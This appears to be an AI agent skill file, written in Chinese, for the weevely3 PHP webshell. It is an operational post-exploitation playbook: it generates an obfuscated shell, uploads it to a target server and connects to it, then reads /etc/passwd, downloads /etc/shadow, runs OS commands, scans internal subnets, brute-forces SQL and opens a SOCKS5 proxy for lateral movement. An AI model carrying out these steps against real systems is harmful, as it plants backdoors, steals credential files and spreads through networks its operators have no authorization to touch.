---
name: weevely3
description: >
  此技能适用于用户询问关于 "weevely3"、"文件操作、横向移动"、"文件操作模块"。隐蔽 PHP Webshell，内置 30+ 后渗透模块，支持文件操作、横向移动和持久化。在文件上传或 RFI 漏洞利用成功后使用，可获得带内置后渗透模块的交互式 PHP Shell。
---

# Weevely3

内置 30+ 后渗透模块的隐蔽 PHP Webshell。

## 快速开始

```bash
git clone https://github.com/epinna/weevely3
cd weevely3 && pip3 install -r requirements.txt

# 生成混淆后的 PHP Shell
python3 weevely.py generate MyPassword shell.php
# 将 shell.php 上传到目标服务器

# 连接
python3 weevely.py http://target.com/uploads/shell.php MyPassword
```

## 核心命令（Shell 内使用）

| 命令 | 用途 |
|---------|---------|
| `:help` | 列出所有模块 |
| `:file_read /etc/passwd` | 读取文件 |
| `:file_download /etc/shadow /tmp/shadow` | 下载文件 |
| `:file_upload /local/file /remote/path` | 上传文件 |
| `:shell_sh "id"` | 执行 OS 命令 |
| `:net_scan 192.168.1.0/24 22,80,443` | 端口扫描 |
| `:net_proxy socks5` | 启动 SOCKS5 代理 |
| `:audit_phpconf` | 审计 PHP 配置 |
| `:bruteforce_sql` | SQL 暴力破解 |

## 常用工作流

**上传后完整后渗透流程：**
```
:shell_sh "id && uname -a"
:file_read /etc/passwd
:net_scan 10.10.10.0/24 22,80,443
:net_proxy socks5 0.0.0.0 1080
```

**通过 SOCKS5 进行横向移动：**
```
:net_proxy socks5 127.0.0.1 1080
# 配置 proxychains → proxychains nmap internal_host
```

## 参考资源

| 文件 | 何时加载 |
|------|--------------|
| `references/` | 模块列表及绕过选项 |
